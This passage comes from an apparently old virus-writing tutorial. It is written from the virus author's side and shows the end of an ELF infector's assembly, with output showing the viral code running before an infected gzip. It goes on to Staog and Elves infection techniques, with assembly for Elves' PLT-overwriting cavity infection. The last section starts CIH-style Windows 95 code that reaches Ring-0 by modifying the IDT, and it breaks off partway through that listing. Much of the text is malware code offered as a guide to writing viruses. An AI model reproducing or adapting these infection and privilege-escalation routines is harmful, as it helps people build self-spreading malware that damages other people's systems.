+texto &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'HELLO WORLD'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0h</span><br/>
+<br/>
+Elf_header<span style="color: #339933;">:</span><br/>
+e_ident<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+e_type<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_machine<span style="color: #339933;">:</span> &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_version<span style="color: #339933;">:</span> &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_entry<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_phoff<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_shoff<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+e_flags<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_ehsize<span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_phentsize<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_phnum<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_shentsize<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_shnum<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+e_shstrndx<span style="color: #339933;">:</span> &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+jur<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+Program_header<span style="color: #339933;">:</span><br/>
+p_type &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+p_offset &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+p_vaddr &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+p_paddr &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+p_filez &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+p_memez &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+p_flags &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+p_align &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Section_entry<span style="color: #339933;">:</span><br/>
+sh_name &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span> <br/>
+sh_type &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">01h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+sh_flags &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">03h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span> &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;alloc</span><br/>
+sh_addr &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+sh_offset &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+sh_size &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: black;">&#40;</span>virend<span style="color: #339933;">-</span>main<span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #ff0000;">2</span><br/>
+sh_link &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+sh_info &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+sh_addralign <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">01h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+sh_entsize &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+<br/>
+virend<span style="color: #339933;">:</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;****************************************************************************</span><br/>
+&nbsp;</div>
+<p>If we execute this in a directory where is the gzip file, we will obtain the following message in the screen:</p>
+<pre>	HELLO WORLD</pre>
+<p>If we execut the gzip, we will obtain this:</p>
+<pre>
+ HELLO WORLDgzip: compressed data not written to a terminal. Use -f to force compression.
+ For help, type:gzip -h
+</pre>
+<p>As you can see,the viral code is executed before the host, and after that it returns to it the control without any kind of dificulty.</p>
+<p>However there are other methods that allow the infection without expanding any section of the Program Header. The Staog virus and the Elves virus use alternative methods.</p>
+<p>Staog, for example, overwrites the entrypoint of the host with the code of the virus, and the overwritten code is copied to the end of the host. The virus, when receives the control at the execution moment, opens the file (for know the name it takes a look in the stack),takes the code of the virus and make a temporal file in the /tmp directory. After doing that, it calls to fork and while an execution thread is executing the viral code of the temporal archive by meand of execve, other execution thread copies that code to the stack of the program and give the control to that code, that will rebuild the code of the host, and return the control to the original entrypoint.</p>
+<p>Elves, however, made by Super of the group 29A, uses a method much more advanced that makes perprocess residency, and avoids that the infected files grow up in size (cavity infection).</p>
+<p>NOTE: For more information about perprocess residecy and the structure and use of the PLT, take a look to the article of perprocess residency.</p>
+<p>The method consists in introduce the viral code in the PLT. The PLT is a necessary structure of the executable that allows the dynamic link of the functions. For that it doesn't move the PLT to other part of the executable or anything similar, the viral code overwrites it, but it continues working perfectly.</p>
+<p>As i will explain in the article about PerProcess residency, there're 2 ways to make a call to a library: by means of the dynamic linker (when we don't know what's the address of the function), or directly with a specific entry for that function in the PLT (when we've already obtained in the GOT the address). After Elves infection, the second method is disabled, and all the calls are made by means of the dynamic linker. The virus overwrites from the second entry, leaving untouched the first one (the one that makes the jump to the dynamic linker).</p>
+<p>As we can see in the article about PerProcess residency, an entry in the PLT has the following form:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #339933;">*</span>address_of_GOT<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl &nbsp; entry_in_reloc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Necessary for the D.L. for</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; first_PLT_entry &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; know what function needs</span><br/>
+&nbsp;</div>
+<p>As you can see, it's not a very optimized code, the first jump would occupy 5 bytes, the push other 5 bytes, and the next jump another 5 bytes, so the entry would have 15 bytes. So the virus is divided in blocks of 15 bytes, and this allows a sequential execution of the code in a normal way, but in the case that we try to make a jump to the beginning of a PLT entry, it would found a jmp previous_PLT_entry codified only with 2 bytes, with the opcodex 0xEB, 0xEE.</p>
+<p>Let's see an example:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">virus_start<span style="color: #339933;">:</span>&nbsp; &nbsp; <br/>
+fake_plt_entry1<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushal<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> get_delta<br/>
+<br/>
+get_delta<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">enter</span> <span style="color: #0000ff; font-weight: bold;">$</span>Stat_size<span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">0x0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: black;">&#40;</span>Pushl<span style="color: #339933;">+</span>Pushal<span style="color: #339933;">+</span>Pushl<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#41;</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: #ff0000;">0x83</span><br/>
+fake_plt_entry2<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: #ff0000;">0xeb</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0xee</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; leal <span style="color: #339933;">-</span><span style="color: #ff0000;">0x7</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#41;</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl <span style="color: #339933;">-</span><span style="color: #ff0000;">0x4</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#41;</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; subl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; shrl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>Pushl<span style="color: #339933;">+</span>Pushal<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#41;</span><br/>
+<br/>
+<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: #ff0000;">0x83</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; If we execute sequentially this code, we will</span><br/>
+fake_plt_entry3<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; execute the opcodes 0x83,0xEB,0xDE as if it was</span><br/>
+<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: #ff0000;">0xeb</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0xde</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; an only one opcode, so we would execute the </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; opcode sub ebx,-22</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; But if we make a system call, this jumps to the</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; 3rd entry of the PLT. The processor would find </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; the opcodes 0xEB,0xDE, that is the opcode of a</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; jmp fake_plt_entry2</span><br/>
+&nbsp;</div>
+<p>By means of that, when a jump to any PLT entry is done, the execution thread would find miraculously 0xEB opcodes, that will go making little jumps until the virus_start label. From here, the virus will be execute sequentially garbage opcodes like sub ebx,-22 that really are hiding a jmp PLT_entry, and after trying to infect the first call to each system call, it makes a jump to the first PLT entry, so it jumps to the dynamic linker.</p>
+<p>I received the source code of this virus for test it, and painfully, in my Linux version it is not functional (Debian 2.0.34). This is because Super, with his needs of optimizing in space the virus, makes the following code for push the reloc entry and avoid to put a push each entry (that would have make him to break the virus in fragments even smaller):</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; This is a generic code for push the entry in the reloc section</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: black;">&#40;</span>Pushl<span style="color: #339933;">+</span>Pushal<span style="color: #339933;">+</span>Pushl<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#41;</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; in EAX the return value of CALL imm</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; leal <span style="color: #339933;">-</span><span style="color: #ff0000;">0x7</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#41;</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">; in ESI the offset to the beginning of PLT</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl <span style="color: #339933;">-</span><span style="color: #ff0000;">0x4</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#41;</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">; in EAX the value of the immediate</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; subl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Substract the two values</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; shrl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; in EAX i will have the reloc entry</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>Pushl<span style="color: #339933;">+</span>Pushal<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">; Push the new value</span><br/>
+&nbsp;</div>
+<p>The dynamic linker need entries in the .reloc.plt section for know what address it needs to resolve. For that, it supposes that the consecutive entries of the PLT will have consecutive entries in the .reloc.plt section, and if fact, that's true. If we take a look to any PLT, the compiler puts in the first PLT a <code>PUSH 0x00</code>, in the second PLT a <code>PUSH 0x08</code>, in the third a <code>PUSH 0x10</code>, and so on. This is not really a problem, the real problem is to suppose that all the calls to the PLT are done with a <code>CALL</code> immediate (being the immediate a 4 bytes value). When we do a <code>CALL</code> in assembler, the processor pushes the return address on the stack (i.e. the address of the next instruction of the call). The virus, as we can see, reads from the stack that value, substracts to it a 4 (the size of the immediate) and reads the value pointed by that address (the next code after the call). To that value, it substracts the PLT address, so we obtain the difference of bytes of the PLT entry we've called to, and the beginning of the PLT, and with that value, it obtains the entry value in the reloc section with a simple rotation opcode. This method is okay if we only make calls with the opcode <code>CALL</code> immediate. This might be true, for example in the newest Linux versions,but for example my Linux version makes jumps to the PLT of the host only with the opcode <code>CALL *EBP</code> also this instruction is not codifies in host's code, it's done by the dynamic linker even before the host takes the control (i still don't know why).</p>
+<p>Anyway this method is very interesting and useful.</p>
+<h2>Resident Viruses</h2>
+<h3>Global residency in Ring-0</h3>
+<p>The resident viruses in Ring-0 are those that achieve maximum privileges in the processor, and already in Ring-0 they hook the system calls made by all the processes of the system.</p>
+<p>For achieve Ring-0 an user process should try to make various things: it could try to modify the IDT for generate a TRAP GATE, modify the GDT or the LDT for generate a CALL GATE, or even patch code in Ring-0, so as our code would receive the execution thread already in Ring-0. Wihtout any doubt, it seems a hard work, because all those structures are or should be protected by the OS.</p>
+<p>But in systems like Windows 95, where code like this (used by the CIH virus) allows us to jump to Ring-0 without difficulty:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;****************************************************************************</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>586p<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model &nbsp;<span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>STDCALL<br/>
+<br/>
+extrn &nbsp; ExitProcess<span style="color: #339933;">:</span>PROC<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">.data</span><br/>
+<br/>
+idtaddr <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;?<span style="color: #339933;">,</span>?<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;************* Start of code for achieve Ring-0 *************</span><br/>
+<br/>
+startvirii<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sidt</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">qword</span> ptr <span style="color: black;">&#91;</span>idtaddr<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Obtain limit and address of the IDT</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span>idtaddr<span style="color: #339933;">+</span><span style="color: #ff0000;">2h</span><span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">; in EBX the base</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>8d<span style="color: #339933;">*</span>5d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Modify int 5 cause i'm gonna use its</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; IDT entry</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span>ring0code<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; in EDX goes the ring0code offset &nbsp; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Modify IDT entry offset for make</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; the jump to ring0code when the int</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>16d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; 5h is executed</span><br/>
